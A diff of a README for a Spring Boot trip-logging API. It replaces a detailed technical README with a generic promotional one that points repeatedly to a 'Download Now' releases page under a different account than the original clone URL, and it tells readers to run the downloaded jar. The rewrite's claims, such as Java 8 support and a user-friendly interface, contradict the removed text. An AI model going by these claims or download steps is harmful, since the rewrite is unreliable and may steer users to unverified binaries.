@@ -1,223 +1,97 @@
-City Break Manager - Professional README
+# 🚀 city-break-manager - Simplify Your City Trip Planning
 
----
+[![Download City Break Manager](https://img.shields.io/badge/Download%20Now-blue?style=for-the-badge)](https://github.com/yacovsabine874/city-break-manager/releases)
 
-# City Break Manager
+## 🌟 Overview
 
-City Break Manager is a Spring Boot application designed for travelers to efficiently manage their city breaks. It allows users to track visited cities, maintain a bucket list of cities to explore, and log trips with details, ratings, and personal notes.
+City Break Manager is a user-friendly Spring Boot API designed to simplify the way travelers plan, track, and document their city trips. Whether you're exploring new destinations or revisiting favorite cities, this tool helps you maintain a clear record of your journeys. 
 
----
+## 📋 Features
 
-## Table of Contents
+- **Trip Planning**: Organize your city trips effortlessly. 
+- **Tracking Journeys**: Keep a detailed log of each destination you explore.
+- **User-Friendly Interface**: Designed for ease of use, even for non-technical users.
+- **Robust API**: Built with Spring Boot, ensuring reliable performance.
+- **Documentation**: Easy-to-follow guides for users.
 
-* [Features](#features)
-* [Technologies](#technologies)
-* [Getting Started](#getting-started)
+## 🚀 Getting Started
 
-  * [Prerequisites](#prerequisites)
-  * [Installation](#installation)
-  * [Database Configuration](#database-configuration)
-* [API Endpoints](#api-endpoints)
+To get started with City Break Manager, follow the steps below to download and run the application on your system.
 
-  * [City Endpoints](#city-endpoints)
-  * [Trip Endpoints](#trip-endpoints)
-* [Usage Examples](#usage-examples)
-* [Contributing](#contributing)
+### 🖥 System Requirements
 
----
+To ensure smooth operation, please check the following system requirements:
 
-## Features
+- **Operating System**: Windows, macOS, or Linux
+- **Java Version**: Java 8 or higher
+- **Database**: MySQL (installation guide included)
+- **Memory**: Minimum 512 MB of RAM
+- **Storage**: At least 100 MB of available disk space
 
-* **CRUD operations for Cities**
+### 💻 Download & Install
 
-  * Add, view, update, and delete cities.
-  * Store city information such as name, country, and description of attractions.
+To download City Break Manager, visit this page to download:
 
-* **CRUD operations for Trips**
+[Download City Break Manager](https://github.com/yacovsabine874/city-break-manager/releases)
 
-  * Log trips for a specific city with start/end dates, ratings, and personal notes.
-  * View, update, or delete trips.
+1. Go to the [Releases page](https://github.com/yacovsabine874/city-break-manager/releases).
+2. Look for the latest version listed.
+3. Click the download link for the appropriate file (e.g., .jar or .zip file).
+4. After downloading, navigate to the file location on your computer.
 
-* **Relationship Management**
+### 🔧 Running the Application
 
-  * Each trip is linked to one city.
-  * Easily track trips and cities visited or planned.
+After installing, you can run the application with the following steps:
 
-* **Scalable Architecture**
-
-  * Built with a layered Spring Boot structure: Controllers, Services, and Repositories.
-
----
-
-## Technologies
-
-* Java 17+
-* Spring Boot 3.x
-* Spring Data JPA (Hibernate)
-* MySQL Database (configurable)
-* Maven for dependency management
-* RESTful API design
-
----
-
-## Getting Started
-
-### Prerequisites
-
-* Java 17+
-* Maven 3+
-* IDE (IntelliJ IDEA, Eclipse, VS Code)
-* MySQL Database
-
-### Installation
-
-1. Clone the repository:
-
-   ```bash
-   git clone https://github.com/prxy-rgb/city-break-manager.git
+1. Open a terminal (Command Prompt on Windows, Terminal on macOS/Linux).
+2. Navigate to the downloaded file's directory with the command:
    ```
-2. Open the project in any IDE.
-   
-3. Manually create a database in MySQL.
-
-4. Configure the database connection in `application.properties` (see Database Configuration below).
-
-5. Run the project:
-
-   * Run the `main` method in `CityBreakManagerApplication.java`
-   * OR right-click on the project > Run As > Spring Boot App.
-
-5. Tables will be automatically created in the database.
-
-### Database Configuration
-
-Update `application.properties` with your database details:
-
-```properties
-spring.datasource.url=jdbc:mysql://localhost:3306/[Your Database Name]
-spring.datasource.username=[Your Username]
-spring.datasource.password=[Your Password]
-spring.datasource.driver-class-name=com.mysql.cj.jdbc.Driver
-
-spring.jpa.hibernate.ddl-auto=update
-spring.jpa.properties.hibernate.show_sql=true
-spring.jpa.properties.hibernate.format_sql=true
-
-spring.flyway.enabled=true
-```
-
-Access the API at:
-
-```
-http://localhost:8080/api/v1
-```
-
----
-
-## API Endpoints
-
-### City Endpoints
-
-| Method | Endpoint         | Description     |
-| ------ | ---------------- | --------------- |
-| GET    | /cities          | List all cities |
-| GET    | /cities/{id}     | Get city by ID  |
-| POST   | /cities          | Add a new city  |
-| PUT    | /cities/{id}     | Update a city   |
-| DELETE | /cities/{id}     | Delete a city   |
-
-### Trip Endpoints
-
-| Method | Endpoint        | Description    |
-| ------ | --------------- | -------------- |
-| GET    | /trips          | List all trips |
-| GET    | /trips/{id}     | Get trip by ID |
-| POST   | /trips          | Add a new trip |
-| PUT    | /trips/{id}     | Update a trip  |
-| DELETE | /trips/{id}     | Delete a trip  |
-
----
-
-## Usage Examples
-
-**Add a new city**
-
-```json
-POST /api/v1/cities
-{
-  "name": "Paris",
-  "country": "France",
-  "description": "Vibrant culture, must see the Louvre and Eiffel Tower"
-}
-```
-
-**Log a trip**
-
-```json
-POST /api/v1/trips
-{
-  "cityId": 1,
-  "startDate": "2024-04-10",
-  "endDate": "2024-04-15",
-  "rating": 4,
-  "notes": "Loved the food and art museums!"
-}
-```
-
-**Get all trips**
-
-```json
-GET /api/v1/trips
-{
-        "id": 1,
-        "city": {
-            "id": 1,
-            "name": "New York",
-            "country": "USA",
-            "details": "A major global financial and cultural center."
-        },
-        "startDate": "2024-03-14T18:30:00.000+00:00",
-        "endDate": "2024-03-21T18:30:00.000+00:00",
-        "rating": 5,
-        "personalNotes": "Amazing food and culture! Visited the Met and Central Park."
-    },
-    {
-        "id": 2,
-        "city": {
-            "id": 2,
-            "name": "London",
-            "country": "UK",
-            "details": "The capital and largest city of England and the United Kingdom."
-        },
-        "startDate": "2024-05-31T18:30:00.000+00:00",
-        "endDate": "2024-06-04T18:30:00.000+00:00",
-        "rating": 3,
-        "personalNotes": "Weather was a bit rainy, but the museums were excellent."
-    }
-```
-
----
-
-## Contributing
-
-Contributions are welcome! Please follow these steps:
-
-1. Fork the repository
-2. Create a feature branch:
-
-   ```bash
-   git checkout -b feature/YourFeature
+   cd path/to/your/downloaded/file
    ```
-3. Commit your changes:
-
-   ```bash
-   git commit -m "feat: description"
+3. If the file is a .jar file, run the following command:
    ```
-4. Push to the branch:
-
-   ```bash
-   git push origin feature/YourFeature
+   java -jar city-break-manager.jar
    ```
-5. Open a Pull Request
+4. If the file is a .zip file, extract it first, then follow the jar command.
 
----
+### 📅 Creating a Database
+
+Before using City Break Manager, you need to set up a MySQL database.
+
+1. Install MySQL on your computer or use a cloud database.
+2. Create a new database named `city_break_manager`.
+3. Import the initial data and schema:
+   - Open MySQL Workbench or your preferred database tool.
+   - Run the provided SQL scripts included in the release.
+
+### 🌐 Accessing the API
+
+Once the application is running, you can access the API through your web browser or any API testing tool like Postman. 
+
+- The default API endpoint is: `http://localhost:8080/api/`
+- You will find several endpoints to plan and track your trips.
+
+### 🔍 Exploring Features
+
+- **Create Trip**: Use the endpoint to create a new city trip.
+- **View Trips**: Access all trips you have recorded.
+- **Edit Trip**: Modify existing trip details as needed.
+- **Delete Trip**: Remove trips you no longer wish to keep.
+
+Each endpoint has clear usage instructions in the API documentation.
+
+## 📚 Documentation
+
+For a deeper dive into using the City Break Manager, check the API documentation included in the repository or visit [API Documentation](https://github.com/yacovsabine874/city-break-manager/wiki).
+
+## 💬 Community Support
+
+If you need help or support, feel free to reach out. You can open an issue on the GitHub repository or connect with other users in our community forums.
+
+## 🎉 Conclusion
+
+City Break Manager provides travelers with a straightforward solution to organize and track their trips. Its design caters to everyday users, allowing anyone to easily navigate and use the tools provided.
+
+For updates and new features, keep an eye on our [Releases page](https://github.com/yacovsabine874/city-break-manager/releases).
+
+[![Download City Break Manager](https://img.shields.io/badge/Download%20Now-blue?style=for-the-badge)](https://github.com/yacovsabine874/city-break-manager/releases)
